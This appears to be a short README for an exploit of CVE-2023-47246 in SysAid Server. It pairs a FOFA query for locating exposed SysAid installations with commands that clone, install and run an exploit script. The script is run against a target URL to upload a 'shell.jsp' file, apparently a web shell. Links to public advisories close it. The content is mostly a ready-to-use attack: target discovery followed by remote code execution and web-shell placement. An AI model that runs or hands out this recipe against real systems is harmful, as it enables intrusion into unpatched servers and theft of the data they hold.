# Vulnerability Details

1. fofa:

   ```text
   body="sysaid-logo-dark-green.png" || title="SysAid Help Desk Software" || body="Help Desk software <a href=\"http://www.sysaid.com\">by SysAid</a>"
   ```

2. Affected versions: SysAid Server<23.3.36

# Vulnerability Recurrence

1. Execute the script:

   ```shell
   git clone https://github.com/W01fh4cker/CVE-2023-47246-EXP.git
   cd CVE-2023-47246-EXP
   pip install -r requirements.txt
   python CVE-2023-47246-EXP.py -u http://192.168.161.190:8443 -p http://127.0.0.1:8083 -f shell.jsp
   ```

2. result:![](https://github.com/W01fh4cker/CVE-2023-47246-EXP/assets/101872898/690d6a3c-b5ce-45bb-b37a-7d5ca72b13ab)

# Reference

https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2023/CVE-2023-47246.yaml  
https://www.huntress.com/blog/critical-vulnerability-sysaid-cve-2023-47246  
https://www.sysaid.com/blog/service-desk/on-premise-software-security-vulnerability-notification  
https://www.zscaler.com/blogs/security-research/coverage-advisory-cve-2023-47246-sysaid-zero-day-vulnerability

